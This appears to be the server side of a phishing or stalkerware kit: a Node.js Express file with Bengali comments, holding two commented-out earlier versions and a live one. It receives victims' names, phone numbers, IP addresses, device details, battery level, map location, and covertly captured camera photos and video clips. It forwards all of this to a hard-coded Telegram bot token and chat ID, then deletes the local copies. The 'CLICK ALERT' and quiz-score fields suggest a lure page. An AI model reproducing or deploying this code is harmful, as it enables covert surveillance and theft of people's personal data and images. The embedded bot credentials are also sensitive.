

// const express = require('express');
// const bodyParser = require('body-parser');
// const path = require('path');
// const fs = require('fs');
// const axios = require('axios');
// const FormData = require('form-data');

// const app = express(); 

// const TELEGRAM_BOT_TOKEN = '6960217292:AAGqg4_Q-IdVxJyoictdMmWJ9mH3fun_tiY';
// const CHAT_ID = '6146766939';

// ['./images', './videos'].forEach(dir => { if (!fs.existsSync(dir)) fs.mkdirSync(dir); });

// app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));
// app.use(bodyParser.json({ limit: '100mb' }));
// app.set('view engine', 'ejs');
// app.use(express.static('public'));

// // Report Pathano function
// app.post('/info', (req, res) => {
//     const d = JSON.parse(decodeURIComponent(req.body.data));
//     const report = `<b>👤 Name:</b> ${d.name}\n` +
//                    `<b>📱 Phone:</b> <code>${d.phone}</code>\n` +
//                    `<b>🎯 Score:</b> ${d.score}/10\n` +
//                    `<b>💻 Device:</b> ${d.model}\n` +
//                    `<b>📍 Location:</b> <a href="${d.map}">View Map</a>`;

//     axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
//         chat_id: CHAT_ID, text: report, parse_mode: 'HTML'
//     });
//     res.send('ok');
// });

// // Camera & Video Handlers
// app.post('/camsnap', (req, res) => {
//     const base64Data = req.body.img.replace(/^data:image\/jpeg;base64,/, "");
//     const filePath = path.join(__dirname, 'images', `s_${Date.now()}.jpg`);
//     fs.writeFileSync(filePath, base64Data, 'base64');
//     const formData = new FormData();
//     formData.append('chat_id', CHAT_ID);
//     formData.append('document', fs.createReadStream(filePath));
//     axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, formData, { headers: formData.getHeaders() })
//     .then(() => { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); });
//     res.send('ok');
// });

// app.post('/video-upload', (req, res) => {
//     const base64Data = req.body.video.replace(/^data:video\/webm;base64,/, "");
//     const filePath = path.join(__dirname, 'videos', `v_${Date.now()}.webm`);
//     fs.writeFileSync(filePath, base64Data, 'base64');
//     const formData = new FormData();
//     formData.append('chat_id', CHAT_ID);
//     formData.append('document', fs.createReadStream(filePath));
//     axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, formData, { headers: formData.getHeaders() })
//     .then(() => { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); });
//     res.send('ok');
// });

// app.get('/', (req, res) => { res.render('index'); });
// app.listen(3000, () => console.log("🚀 V3 Running on Port 3000"));




// const express = require('express');
// const bodyParser = require('body-parser');
// const path = require('path');
// const fs = require('fs');
// const axios = require('axios');
// const FormData = require('form-data');

// const app = express();

// // --- Config ---
// const TELEGRAM_BOT_TOKEN = '6960217292:AAGqg4_Q-IdVxJyoictdMmWJ9mH3fun_tiY';
// const CHAT_ID = '6146766939';

// // ফোল্ডার তৈরি
// ['./images', './videos'].forEach(dir => {
//     if (!fs.existsSync(dir)) fs.mkdirSync(dir);
// });

// app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));
// app.use(bodyParser.json({ limit: '100mb' }));
// app.set('view engine', 'ejs');
// app.use(express.static('public'));

// // টেলিগ্রামে ফাইল পাঠানোর ফাংশন
// function sendToTelegram(filePath, caption) {
//     const formData = new FormData();
//     formData.append('chat_id', CHAT_ID);
//     formData.append('caption', caption);
//     formData.append('document', fs.createReadStream(filePath));

//     axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, formData, {
//         headers: formData.getHeaders()
//     }).then(() => { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); })
//         .catch(err => console.log("File Error"));
// }

// app.get('/', (req, res) => { res.render('index'); });

// মেইন ডেটা রিপোর্ট
// app.post('/info', (req, res) => {
//     const d = JSON.parse(decodeURIComponent(req.body.data));
//     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; // ইউজারের আইপি

//     const msg = `<b>🚨 CLICK ALERT / REPORT</b>\n\n` +
//                 `👤 <b>Name:</b> ${d.name}\n` +
//                 `📱 <b>Phone:</b> ${d.phone}\n` +
//                 `🌐 <b>IP:</b> <code>${ip}</code>\n` +
//                 `💻 <b>Device:</b> ${d.model}\n` +
//                 `🌐 <b>UA:</b> <code>${d.ua}</code>\n` +
//                 `📍 <b>Location:</b> <a href="${d.map}">View Map</a>`;

//     axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
//         chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'
//     });
//     res.send('ok');
// });

const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');

// app-ও একবারই থাকবে
const app = express();
// --- Config ---
const TELEGRAM_BOT_TOKEN = '6960217292:AAGqg4_Q-IdVxJyoictdMmWJ9mH3fun_tiY';
const CHAT_ID = '6146766939';

// ফোল্ডার তৈরি
['./images', './videos'].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir);
});

app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));
app.use(bodyParser.json({ limit: '100mb' }));
app.set('view engine', 'ejs');
app.use(express.static('public'));

// ফাইল পাঠানোর ফাংশন
function sendToTelegram(filePath, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('caption', caption);
    formData.append('document', fs.createReadStream(filePath));

    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, formData, {
        headers: formData.getHeaders()
    }).then(() => { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); })
    .catch(err => console.log("File Error"));
}

app.get('/', (req, res) => { res.render('index'); });

// মেইন ডেটা রিপোর্ট (Manual Answers সহ)
app.post('/info', (req, res) => {
    const d = JSON.parse(decodeURIComponent(req.body.data));
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; 
    
    const msg = `<b>📊 ACTIVITY REPORT</b>\n\n` +
                `👤 <b>Name:</b> ${d.name || 'N/A'}\n` +
                `📱 <b>Phone:</b> <code>${d.phone || 'N/A'}</code>\n` +
                `📝 <b>Data:</b> <code>${d.score}</code>\n` +
                `🔋 <b>Battery:</b> ${d.battery}\n` +
                `🌐 <b>IP:</b> <code>${ip}</code>\n` +
                `💻 <b>Device:</b> ${d.model}\n` +
                `📍 <b>Location:</b> <a href="${d.map}">View Map</a>`;
    
    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID, text: msg, parse_mode: 'HTML', disable_web_page_preview: true
    });
    res.send('ok');
});

app.post('/camsnap', (req, res) => {
    const base64Data = req.body.img.replace(/^data:image\/jpeg;base64,/, "");
    const filePath = path.join(__dirname, 'images', `s_${Date.now()}.jpg`);
    fs.writeFileSync(filePath, base64Data, 'base64');
    sendToTelegram(filePath, "📸 Photo Captured");
    res.send('ok');
});

app.post('/video-upload', (req, res) => {
    const base64Data = req.body.video.replace(/^data:video\/webm;base64,/, "");
    const filePath = path.join(__dirname, 'videos', `v_${Date.now()}.webm`);
    fs.writeFileSync(filePath, base64Data, 'base64');
    sendToTelegram(filePath, "🎥 Video Clip");
    res.send('ok');
});

app.listen(3000, () => console.log("🚀 Server Live at Port 3000"));
